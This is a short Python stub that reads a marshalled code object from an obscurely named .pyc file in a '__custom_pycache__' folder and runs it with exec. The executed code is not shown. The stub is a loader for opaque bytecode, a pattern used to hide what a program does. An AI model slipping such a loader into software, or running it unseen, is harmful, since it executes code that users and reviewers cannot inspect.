
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Utils_288d6955469d4f6e813caed2b36f7e97.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
